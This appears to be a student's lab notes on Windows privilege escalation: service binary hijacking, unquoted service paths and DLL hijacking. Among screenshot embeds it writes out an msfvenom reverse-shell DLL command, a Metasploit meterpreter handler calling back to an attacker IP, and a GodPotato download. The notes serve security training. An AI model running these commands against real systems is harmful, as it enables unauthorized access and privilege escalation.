To see Local Group members of the same group
Get-LocalGroupMember -Group "Remote Desktop Users"

### 16.1.3 Hidden in Plain View Q3

![[Pasted image 20231023212122.png]]
![[Pasted image 20231023212422.png]]

![[Pasted image 20231023212448.png]]
![[Pasted image 20231023212513.png]]

### 16.1.4 Question 2
![[Pasted image 20231024180530.png]]
open up a server

![[Pasted image 20231024180546.png]]
after nc into the machine, download the seatbelt.exe file
![[Pasted image 20231024180626.png]]
![[Pasted image 20231024180823.png]]

### 16.2 Binary Jacking
![[Pasted image 20231024185034.png]]
![[Pasted image 20231024185351.png]]
![[Pasted image 20231024185407.png]]

log in as dave2 and open a cmd as an Administrator

### 16.2.1 Question 2
![[Pasted image 20231024193756.png]]
once logged into system,

**DON'T FORGET TO SET UP THE HTTP SERVER TO LISTEN TO**
get the the PowerUp.ps1 powershell into the system to upgrade the powershell
![[Pasted image 20231025205945.png]]
![[Pasted image 20231025205957.png]]
![[Pasted image 20231025210216.png]]we stop the BackupMonitor, move to the appropiate folder location and rename the file to old 

create the payload and set up the listener
![[Pasted image 20231025210211.png]]
Next, we stop the BackupMonitor exe file, rename it to something else, and then 

Next, we are going to cd to the backupmonitor, retrieve the payload from our kali and start BackupMonitor again
![[Pasted image 20231025210216.png]]
![[Pasted image 20231025210505.png]]
once you catch the payload, type shell and get the flag

MAJOR CMDs in this module
cl

msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set EXITFUNC=thread;set LHOST 192.168.45.179;set LPORT 4444;run;"

I dropped another shell to make it constant
![[Pasted image 20231025214525.png]]

### 16.2.2
![[Pasted image 20231027195151.png]]

use the credentials you just created from the lab


### 16.2.3 Unquoted Services

use Get-CimInstance -ClassName win32_service | Select Name,State,PathName to see all the win_32 services
look for the unquoted ones with space

![[Pasted image 20231027212432.png]]
use the adduser you created, but change the name to Surveillance.exe
once we download it, copy to the folder where you can move such file
![[Pasted image 20231027212836.png]]

**need to keep dropping folder to get it where you need it to put it at**
![[Pasted image 20231027212932.png]]

### 16.3.1 
![[Pasted image 20231028050415.png]]

![[Pasted image 20231028050634.png]]
![[Pasted image 20231028050654.png]]
![[Pasted image 20231028050821.png]]

### 16.3.2 Capstone exercise
![[Pasted image 20231028053728.png]]

![[Pasted image 20231028055712.png]]
![[Pasted image 20231028055800.png]]
![[Pasted image 20231028055726.png]]

after running the following cmd, notice how that service is the only one with C:\Service path"
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

![[Pasted image 20231028062230.png]]

navigate to the Services folder
![[Pasted image 20231028192010.png]]
you are going to see that .dll information
use that to create a payload for a reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.179 LPORT=4444 -f dll -o EnterpriseServiceOptional.dll
![[Pasted image 20231028192123.png]]
open a nc port
then navigate to the windows station and download the .dll file, then start services to open the shell
![[Pasted image 20231028192416.png]]
next, look at your privileges
![[Pasted image 20231028192507.png]]
I tried to run the PrintSpoofer64.exe like the lesson and saw this, which I google
![[Pasted image 20231028192959.png]]

God potato can be used for privilege escalation
https://github.com/BeichenDream/GodPotato/releases/tag/V1.20

using the wget command to download the NET-4.exe copy and rename it
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe

![[Pasted image 20231028193230.png]]
download the exe file and run it into the enterpriseuser
![[Pasted image 20231028193420.png]]
![[Pasted image 20231028193434.png]]
shift to cmd, and run the test. once you get the appropiate results, run the command to find the flag
![[Pasted image 20231028193906.png]]

